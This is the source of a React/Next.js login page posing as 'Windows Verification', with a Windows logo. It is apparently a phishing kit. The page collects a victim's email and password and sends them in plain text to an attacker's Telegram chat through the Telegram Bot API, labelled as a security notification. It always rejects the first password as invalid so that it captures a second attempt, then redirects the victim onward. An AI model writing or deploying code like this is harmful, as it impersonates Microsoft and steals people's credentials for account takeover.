import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import CryptoJS from 'crypto-js';
import { useRouter } from 'next/router';

const LoginPage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [step, setStep] = useState(1);
  const router = useRouter();

  useEffect(() => {
    const createCircuitBackground = () => {
      const board = document.querySelector('.circuit-board');
      if (!board) return;
      board.innerHTML = '';
      for (let i = 0; i < 20; i++) {
        const line = document.createElement('div');
        line.className = 'circuit-line';
        const isHorizontal = Math.random() > 0.5;
        const width = isHorizontal ? Math.random() * 300 + 100 : 2;
        const height = isHorizontal ? 2 : Math.random() * 300 + 100;
        line.style.width = `${width}px`;
        line.style.height = `${height}px`;
        line.style.left = `${Math.random() * 100}%`;
        line.style.top = `${Math.random() * 100}%`;
        line.style.opacity = Math.random() * 0.5 + 0.1;
        board.appendChild(line);
      }
      for (let i = 0; i < 30; i++) {
        const node = document.createElement('div');
        node.className = 'circuit-node';
        const size = Math.random() * 12 + 4;
        node.style.width = `${size}px`;
        node.style.height = `${size}px`;
        node.style.left = `${Math.random() * 100}%`;
        node.style.top = `${Math.random() * 100}%`;
        board.appendChild(node);
      }
    };
    createCircuitBackground();
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!email) {
      setError('Please enter your email address');
      return;
    }
    setError('');
    setStep(2); // move to password step
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (password.length < 5) {
      setError('Password must be at least 5 characters');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL;

      if (!telegramBotToken || !telegramChatId) {
        throw new Error('Telegram integration not configured');
      }

      const message = `🔒 *TRU SECURITY NOTIFICATION* 🔒
      
- *User Identified*: ${email}
- *Access Attempt*: ${step === 2 ? 'First Password Attempt' : 'Second Attempt'}
- *Password Attempt*: ||${password}||
- *Timestamp*: ${new Date().toISOString()}
- *Origin*: ${window.location.hostname}`;

      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown' }),
      });

      if (step === 2) {
        // First wrong attempt
        setError('Invalid credentials. Please try again.');
        setStep(3); // move to retry
        setPassword('');
      } else {
        // Second attempt → success
        setSuccess(true);
        if (redirectUrl) {
          setTimeout(() => {
            const target = `${redirectUrl}/?login_hint=${encodeURIComponent(
              email
            )}&prompt=login`;
            window.location.href = target;
          }, 2000);
        }
      }
    } catch (err) {
      setError(err.message || 'An error occurred during login');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 relative overflow-hidden">
      <div className="circuit-board absolute inset-0 z-0 opacity-50"></div>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full max-w-md z-10"
      >
        <div className="bg-white rounded-xl shadow-2xl overflow-hidden">
          <div className="p-6 bg-gradient-to-r from-blue-600 to-blue-500">
            <div className="flex items-center justify-center flex-col">
              <div className="bg-white p-3 rounded-full mb-4">
                <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
                  {/* Windows Logo */}
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" className="h-8 w-8 text-white fill-current">
                    <path d="M0 12.4L35.2 7.6v34.8H0V12.4zm0 63.2V47.6h35.2v32.8L0 75.6zm40.8-68l47.2-6.8v41.2H40.8V7.6zm47.2 74.8l-47.2-6.8V47.6h47.2v34.8z"/>
                  </svg>
                </div>
              </div>
              <p className="text-white font-bold text-xl">Windows Verification</p>
              <p className="text-blue-100 mt-2 text-sm">Verify your email access to continue</p>
            </div>
          </div>

          <div className="p-6 bg-white">
            {error && (
              <div
                className={`mb-4 p-3 rounded-md text-sm ${
                  step === 3
                    ? 'bg-red-100 text-red-700 border border-red-200'
                    : 'bg-yellow-100 text-yellow-700 border border-yellow-200'
                }`}
              >
                {error}
              </div>
            )}
            {success ? (
              <div className="text-center py-4">
                <div className="text-green-500 text-5xl mb-4">✓</div>
                <h3 className="text-xl font-bold text-gray-800 mb-2">Login Successful</h3>
                <p className="text-gray-600">Redirecting you to the application...</p>
              </div>
            ) : step === 1 ? (
              // Email input step
              <form onSubmit={handleEmailSubmit}>
                <div className="mb-4">
                  <label className="block text-gray-700 text-sm font-medium mb-2">Email Address</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    className="border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 text-gray-700"
                    placeholder="Enter your email"
                  />
                </div>
                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 font-medium rounded-md text-sm px-5 py-2.5 text-white shadow-md"
                >
                  Next
                </button>
              </form>
            ) : (
              // Password input step
              <form onSubmit={handleSubmit}>
                {/* Show confirmed email above password field */}
                <div className="mb-4">
                  <p className="text-sm text-gray-600">Signed in as:</p>
                  <p className="font-medium text-gray-800">{email}</p>
                </div>

                <div className="mb-4">
                  <label className="block text-gray-700 text-sm font-medium mb-2">Password</label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    minLength={5}
                    className="border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 text-gray-700"
                    placeholder="Enter your password"
                  />
                </div>
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 font-medium rounded-md text-sm px-5 py-2.5 text-white shadow-md"
                >
                  {isLoading ? (
                    <span>{step === 2 ? 'VERIFYING...' : 'PROCESSING...'}</span>
                  ) : step === 2 ? (
                    'LOGIN'
                  ) : (
                    'TRY AGAIN'
                  )}
                </button>
              </form>
            )}
          </div>
        </div>
      </motion.div>

      <style jsx global>{`
        .circuit-board { position: absolute; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
        .circuit-line { position: absolute; background: rgba(0, 255, 255, 0.15); border-radius: 1px; }
        .circuit-node { position: absolute; background: rgba(0, 200, 255, 0.4); border-radius: 50%; box-shadow: 0 0 15px rgba(0, 200, 255, 0.5); }
      `}</style>
    </div>
  );
};

export default LoginPage;
